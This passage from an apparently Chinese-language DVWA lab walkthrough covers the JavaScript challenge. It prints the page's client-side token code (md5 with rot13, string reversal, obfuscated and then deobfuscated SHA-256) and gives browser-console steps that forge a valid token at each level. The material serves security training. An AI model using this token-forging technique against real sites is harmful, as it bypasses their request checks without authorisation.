1163531501), v = u(v, m = u(m, l = u(l, g, v, m, n[e + 13], 5, -1444681467), g, v, n[e + 2], 9, -51403784), l, g, n[e + 7], 14, 1735328473), m, l, n[e + 12], 20, -1926607734), v = c(v, m = c(m, l = c(l, g, v, m, n[e + 5], 4, -378558), g, v, n[e + 8], 11, -2022574463), l, g, n[e + 11], 16, 1839030562), m, l, n[e + 14], 23, -35309556), v = c(v, m = c(m, l = c(l, g, v, m, n[e + 1], 4, -1530992060), g, v, n[e + 4], 11, 1272893353), l, g, n[e + 7], 16, -155497632), m, l, n[e + 10], 23, -1094730640), v = c(v, m = c(m, l = c(l, g, v, m, n[e + 13], 4, 681279174), g, v, n[e], 11, -358537222), l, g, n[e + 3], 16, -722521979), m, l, n[e + 6], 23, 76029189), v = c(v, m = c(m, l = c(l, g, v, m, n[e + 9], 4, -640364487), g, v, n[e + 12], 11, -421815835), l, g, n[e + 15], 16, 530742520), m, l, n[e + 2], 23, -995338651), v = f(v, m = f(m, l = f(l, g, v, m, n[e], 6, -198630844), g, v, n[e + 7], 10, 1126891415), l, g, n[e + 14], 15, -1416354905), m, l, n[e + 5], 21, -57434055), v = f(v, m = f(m, l = f(l, g, v, m, n[e + 12], 6, 1700485571), g, v, n[e + 3], 10, -1894986606), l, g, n[e + 10], 15, -1051523), m, l, n[e + 1], 21, -2054922799), v = f(v, m = f(m, l = f(l, g, v, m, n[e + 8], 6, 1873313359), g, v, n[e + 15], 10, -30611744), l, g, n[e + 6], 15, -1560198380), m, l, n[e + 13], 21, 1309151649), v = f(v, m = f(m, l = f(l, g, v, m, n[e + 4], 6, -145523070), g, v, n[e + 11], 10, -1120210379), l, g, n[e + 2], 15, 718787259), m, l, n[e + 9], 21, -343485551), l = t(l, i), g = t(g, a), v = t(v, d), m = t(m, h);
+  return [l, g, v, m]
+ }
 
+ function a(n) {
+  var t, r = "",
+   e = 32 * n.length;
+  for (t = 0; t < e; t += 8) r += String.fromCharCode(n[t >> 5] >>> t % 32 & 255);
+  return r
+ }
 
+ function d(n) {
+  var t, r = [];
+  for (r[(n.length >> 2) - 1] = void 0, t = 0; t < r.length; t += 1) r[t] = 0;
+  var e = 8 * n.length;
+  for (t = 0; t < e; t += 8) r[t >> 5] |= (255 & n.charCodeAt(t / 8)) << t % 32;
+  return r
+ }
 
+ function h(n) {
+  return a(i(d(n), 8 * n.length))
+ }
 
+ function l(n, t) {
+  var r, e, o = d(n),
+   u = [],
+   c = [];
+  for (u[15] = c[15] = void 0, o.length > 16 && (o = i(o, 8 * n.length)), r = 0; r < 16; r += 1) u[r] = 909522486 ^ o[r], c[r] = 1549556828 ^ o[r];
+  return e = i(u.concat(d(t)), 512 + 8 * t.length), a(i(c.concat(e), 640))
+ }
 
+ function g(n) {
+  var t, r, e = "";
+  for (r = 0; r < n.length; r += 1) t = n.charCodeAt(r), e += "0123456789abcdef".charAt(t >>> 4 & 15) + "0123456789abcdef".charAt(15 & t);
+  return e
+ }
 
+ function v(n) {
+  return unescape(encodeURIComponent(n))
+ }
+
+ function m(n) {
+  return h(v(n))
+ }
+
+ function p(n) {
+  return g(m(n))
+ }
+
+ function s(n, t) {
+  return l(v(n), v(t))
+ }
+
+ function C(n, t) {
+  return g(s(n, t))
+ }
+
+ function A(n, t, r) {
+  return t ? r ? s(t, n) : C(t, n) : r ? m(n) : p(n)
+ }
+ "function" == typeof define && define.amd ? define(function() {
+  return A
+ }) : "object" == typeof module && module.exports ? module.exports = A : n.md5 = A
+}(this);
+
+    function rot13(inp) {
+        return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
+    }
+
+    function generate_token() {
+        var phrase = document.getElementById("phrase").value;
+        document.getElementById("token").value = md5(rot13(phrase));
+    }
+
+    generate_token();
+</script>
+EOF;
+?>
+```
+其实就是生成了一个 token，用的是 md5 加密。这段代码在 JavaScript 中，也就是前台生成的。
+
+如果你改成 “success” 提交一下会出现了这个，Invalid token。这是什么回事呢？
+
+你可以打开控制台（F12），看看情况。
+你会看到这个 token，不是后台生成的，而是前台生成的。。。而前台生成的 token，是用 `md5("ChangeMe")` 而成的，而后台期待的 md5 是 `md5("success")` 。
+
+![image](../../../img/渗透/实验/dvwa73.png)
+
+知道怎么回事情了？参数里有 token，然后和 `md5(str_rot13(“success”))` 进行比较，一样就给你 well done。
+
+打开浏览器的开发者工具，先界面上输入 success，然后在控制台执行函数 `generate_token()` 提交，成功。
+
+![image](../../../img/渗透/实验/dvwa74.png)
+
+注: 先输入 success 然后 `generate_token()`
+
+### Medium
+**服务器端核心代码**
+```php
+<?php
+$page[ 'body' ] .= <<<EOF
+<script src="/vulnerabilities/javascript/source/medium.js"></script>
+EOF;
+?>
+```
+
+思路是一样的，只是生成 token 的函数放到另外的 js 文件中了。
+```js
+function do_something(e) {
+    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
+    return t
+}
+setTimeout(function () {
+    do_elsesomething("XX")
+}, 300);
+
+function do_elsesomething(e) {
+    document.getElementById("token").value = do_something(e + document.getElementById("phrase").value + "XX")
+}
+```
+
+所以，在输入框输入 success 之后，在控制台中，输入 `do_elsesomething("XX")` 就可以了。
+注: 我这里的路径为 `http://xx.xx.xx.xx/dvwa/vulnerabilities/javascript/`，而代码中访问js文件为 `/vulnerabilities/javascript/source/medium.js` 会导致无法访问js文件，所以像我这种情况的需要自己改下源代码，把路径中的 dvwa 加进去
+
+### High
+**服务器端核心代码**
+```php
+<?php
+$page[ 'body' ] .= <<<EOF
+<script src="/vulnerabilities/javascript/source/high.js"></script>
+EOF;
+?>
+```
+
+高级和中级类似，生成 token 的逻辑在额外的 js 文件中。和中级不同的是，这里的 JS 经过了混淆的。。。就显得很混乱。
+```js
+var a=['fromCharCode','toString','replace','BeJ','\x5cw+','Lyg','SuR','(w(){\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\x202L=!1R&&1c\x202M===\x271n\x27;q\x202o=!Y.2S&&1c\x202d===\x271n\x27&&2d.2Q&&2d.2Q.3S;p(2o){Y=3R}z\x20p(2L){Y=2M}q\x202G=!Y.3Q&&1c\x202g===\x271n\x27&&2g.X;q\x202s=1c\x202l===\x27w\x27&&2l.3P;q\x201y=!Y.3H&&1c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.3z(\x27\x27);q\x202w=[-3y,3x,3v,3w];q\x20U=[24,16,8,0];q\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\x201E=[\x271e\x27,\x2727\x27,\x271G\x27,\x272R\x27];q\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\x204C.Q.2U.1I(1x)===\x27[1n\x201z]\x27}}p(1y&&(Y.50||!Z.1N)){Z.1N=w(1x){A\x201c\x201x===\x271n\x27&&1x.1w&&1x.1w.1J===Z}}q\x202m=w(1X,x){A\x20w(s){A\x20O\x20N(x,1d).S(s)[1X]()}};q\x202a=w(x){q\x20P=2m(\x271e\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\x20O\x20N(x)};P.S=w(s){A\x20P.1T().S(s)};1g(q\x20i=0;i<1E.W;++i){q\x20T=1E[i];P[T]=2m(T,x)}A\x20P};q\x202P=w(P,x){q\x201S=2O(\x222N(\x271S\x27)\x22);q\x201Y=2O(\x222N(\x271w\x27).1Y\x22);q\x202n=x?\x271H\x27:\x271q\x27;q\x202z=w(s){p(1c\x20s===\x272p\x27){A\x201S.2x(2n).S(s,\x274S\x27).1G(\x271e\x27)}z{p(s===2q||s===2T){1u\x20O\x201t(1l)}z\x20p(s.1J===Z){s=O\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\x201S.2x(2n).S(O\x201Y(s)).1G(\x271e\x27)}z{A\x20P(s)}};A\x202z};q\x202k=w(1X,x){A\x20w(G,s){A\x20O\x201P(G,x,1d).S(s)[1X]()}};q\x202f=w(x){q\x20P=2k(\x271e\x27,x);P.1T=w(G){A\x20O\x201P(G,x)};P.S=w(G,s){A\x20P.1T(G).S(s)};1g(q\x20i=0;i<1E.W;++i){q\x20T=1E[i];P[T]=2k(T,x)}A\x20P};w\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\x202h,T=1c\x20s;p(T!==\x272p\x27){p(T===\x271n\x27){p(s===2q){1u\x20O\x201t(1l)}z\x20p(1y&&s.1J===Z){s=O\x202r(s)}z\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}2h=1d}q\x20r,M=0,i,W=s.W,l=k.l;4t(M<W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M<W&&i<1k;++M){l[i>>2]|=s[M]<<U[i++&3]}}z{1g(i=k.1A;M<W&&i<1k;++M){r=s.1Q(M);p(r<R){l[i>>2]|=r<<U[i++&3]}z\x20p(r<2v){l[i>>2]|=(2t|(r>>6))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z\x20p(r<2A||r>=2E){l[i>>2]|=(2D|(r>>12))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z{r=2C+(((r&23)<<10)|(s.1Q(++M)&23));l[i>>2]|=(2X|(r>>18))<<U[i++&3];l[i>>2]|=(R|((r>>12)&V))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}}}k.2u=i;k.L+=i-k.1A;p(i>=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L>4r){k.2i+=k.L/2H<<0;k.L=k.L%2H}A\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\x20l=k.l,i=k.2u;l[16]=k.1C;l[i>>2]|=2w[i&3];k.1C=l[16];p(i>=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i<<3|k.L>>>29;l[15]=k.L<<3;k.1W()};N.Q.1W=w(){q\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j<1k;++j){v=l[j-15];1a=((v>>>7)|(v<<25))^((v>>>18)|(v<<14))^(v>>>3);v=l[j-2];1b=((v>>>17)|(v<<15))^((v>>>19)|(v<<13))^(v>>>10);l[j]=l[j-16]+1a+l[j-7]+1b<<0}1D=b&c;1g(j=0;j<1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o<<0;d=v+4p<<0}z{1B=4v;v=l[0]-4w;h=v-4G<<0;d=v+4D<<0}k.2j=1O}z{1a=((a>>>2)|(a<<30))^((a>>>13)|(a<<19))^((a>>>22)|(a<<10));1b=((e>>>6)|(e<<26))^((e>>>11)|(e<<21))^((e>>>25)|(e<<7));1B=a&b;1j=1B^(a&c)^1D;1h=(e&f)^(~e&g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v<<0;d=v+1f<<0}1a=((d>>>2)|(d<<30))^((d>>>13)|(d<<19))^((d>>>22)|(d<<10));1b=((h>>>6)|(h<<26))^((h>>>11)|(h<<21))^((h>>>25)|(h<<7));1Z=d&a;1j=1Z^(d&b)^1B;1h=(h&e)^(~h&f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v<<0;c=v+1f<<0;1a=((c>>>2)|(c<<30))^((c>>>13)|(c<<19))^((c>>>22)|(c<<10));1b=((g>>>6)|(g<<26))^((g>>>11)|(g<<21))^((g>>>25)|(g<<7));1V=c&d;1j=1V^(c&a)^1Z;1h=(g&h)^(~g&e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v<<0;b=v+1f<<0;1a=((b>>>2)|(b<<30))^((b>>>13)|(b<<19))^((b>>>22)|(b<<10));1b=((f>>>6)|(f<<26))^((f>>>11)|(f<<21))^((f>>>25)|(f<<7));1D=b&c;1j=1D^(b&d)^1V;1h=(f&g)^(~f&h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v<<0;a=v+1f<<0}k.C=k.C+a<<0;k.B=k.B+b<<0;k.E=k.E+c<<0;k.F=k.F+d<<0;k.J=k.J+e<<0;k.I=k.I+f<<0;k.H=k.H+g<<0;k.D=k.D+h<<0};N.Q.1e=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x201e=m[(C>>28)&o]+m[(C>>24)&o]+m[(C>>20)&o]+m[(C>>16)&o]+m[(C>>12)&o]+m[(C>>8)&o]+m[(C>>4)&o]+m[C&o]+m[(B>>28)&o]+m[(B>>24)&o]+m[(B>>20)&o]+m[(B>>16)&o]+m[(B>>12)&o]+m[(B>>8)&o]+m[(B>>4)&o]+m[B&o]+m[(E>>28)&o]+m[(E>>24)&o]+m[(E>>20)&o]+m[(E>>16)&o]+m[(E>>12)&o]+m[(E>>8)&o]+m[(E>>4)&o]+m[E&o]+m[(F>>28)&o]+m[(F>>24)&o]+m[(F>>20)&o]+m[(F>>16)&o]+m[(F>>12)&o]+m[(F>>8)&o]+m[(F>>4)&o]+m[F&o]+m[(J>>28)&o]+m[(J>>24)&o]+m[(J>>20)&o]+m[(J>>16)&o]+m[(J>>12)&o]+m[(J>>8)&o]+m[(J>>4)&o]+m[J&o]+m[(I>>28)&o]+m[(I>>24)&o]+m[(I>>20)&o]+m[(I>>16)&o]+m[(I>>12)&o]+m[(I>>8)&o]+m[(I>>4)&o]+m[I&o]+m[(H>>28)&o]+m[(H>>24)&o]+m[(H>>20)&o]+m[(H>>16)&o]+m[(H>>12)&o]+m[(H>>8)&o]+m[(H>>4)&o]+m[H&o];p(!k.x){1e+=m[(D>>28)&o]+m[(D>>24)&o]+m[(D>>20)&o]+m[(D>>16)&o]+m[(D>>12)&o]+m[(D>>8)&o]+m[(D>>4)&o]+m[D&o]}A\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x202b=[(C>>24)&u,(C>>16)&u,(C>>8)&u,C&u,(B>>24)&u,(B>>16)&u,(B>>8)&u,B&u,(E>>24)&u,(E>>16)&u,(E>>8)&u,E&u,(F>>24)&u,(F>>16)&u,(F>>8)&u,F&u,(J>>24)&u,(J>>16)&u,(J>>8)&u,J&u,(I>>24)&u,(I>>16)&u,(I>>8)&u,I&u,(H>>24)&u,(H>>16)&u,(H>>8)&u,H&u];p(!k.x){2b.4A((D>>24)&u,(D>>16)&u,(D>>8)&u,D&u)}A\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\x201w=O\x20Z(k.x?28:32);q\x201i=O\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\x201w};w\x201P(G,x,1v){q\x20i,T=1c\x20G;p(T===\x272p\x27){q\x20L=[],W=G.W,M=0,r;1g(i=0;i<W;++i){r=G.1Q(i);p(r<R){L[M++]=r}z\x20p(r<2v){L[M++]=(2t|(r>>6));L[M++]=(R|(r&V))}z\x20p(r<2A||r>=2E){L[M++]=(2D|(r>>12));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}z{r=2C+(((r&23)<<10)|(G.1Q(++i)&23));L[M++]=(2X|(r>>18));L[M++]=(R|((r>>12)&V));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}}G=L}z{p(T===\x271n\x27){p(G===2q){1u\x20O\x201t(1l)}z\x20p(1y&&G.1J===Z){G=O\x202r(G)}z\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}}p(G.W>1k){G=(O\x20N(x,1d)).S(G).27()}q\x201F=[],2e=[];1g(i=0;i<1k;++i){q\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\x20X})}}})();w\x202y(e){1g(q\x20t=\x22\x22,n=e.W-1;n>=0;n--)t+=e[n];A\x20t}w\x202J(t,y=\x224B\x22){1m.1o(\x221M\x22).1r=1q(1m.1o(\x221M\x22).1r+y)}w\x202B(e=\x224E\x22){1m.1o(\x221M\x22).1r=1q(e+1m.1o(\x221M\x22).1r)}w\x202K(a,b){1m.1o(\x221M\x22).1r=2y(1m.1o(\x222F\x22).1r)}1m.1o(\x222F\x22).1r=\x22\x22;4u(w(){2B(\x224M\x22)},4N);1m.1o(\x224P\x22).4Q(\x224R\x22,2J);2K(\x223O\x22,44);','||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW','split'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j<e?'':h(parseInt(j/e)))+((j=j%e)>0x23?String[b('0x0')](j+0x1d):j[b('0x1')](0x24));};if(!''[b('0x2')](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if('wpA'!==b('0x3')){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b('0x4');};f=0x1;}}];h=function(){return b('0x4');};f=0x1;};while(f--){if(g[f]){if(b('0x5')===b('0x6')){return i[h];}else{d=d[b('0x2')](new RegExp('\x5cb'+h(f)+'\x5cb','g'),g[f]);}}}return d;}(b('0x7'),0x3e,0x137,b('0x8')[b('0x9')]('|'),0x0,{}));
+```
+
+<p align="center">
+    <img src="../../../img/渗透/实验/dvwa75.png">
+</p>
+
+http://deobfuscatejavascript.com 中提供的功能是，把混淆后的代码转成人类能看懂一些 js 代码,其中关键的部分是这里：
+```js
+function do_something(e) {
+    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
+    return t
+}
+function token_part_3(t, y = "ZZ") {
+    document.getElementById("token").value = sha256(document.getElementById("token").value + y)
+}
+function token_part_2(e = "YY") {
+    document.getElementById("token").value = sha256(e + document.getElementById("token").value)
+}
+function token_part_1(a, b) {
+    document.getElementById("token").value = do_something(document.getElementById("phrase").value)
+}
+document.getElementById("phrase").value = "";
+setTimeout(function() {
+    token_part_2("XX")
+}, 300);
+document.getElementById("send").addEventListener("click", token_part_3);
+token_part_1("ABCD", 44);
+```
+
+这里生成 token 的步骤是
+1. 执行 token_part_1("ABCD", 44)
+2. 执行 token_part_2("XX")(原本是延迟 300ms 执行的那个）
+3. 点击按钮的时候执行 token_part_3
+
+所以我们在输入框输入 success 后，再到控制台中输入 `token_part_1("ABCD", 44)` 和 `token_part_2("XX")` 这两个函数就可以了。
+
+注: 这里同上需要自己改下源代码，把路径中的 dvwa 加进去
+
+### Impossible
+**服务器端核心代码**
+```php
+You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.
+```
+你永远不要相信来自用户的任何东西或阻止他们搞乱它，所以没有不可能的等级。
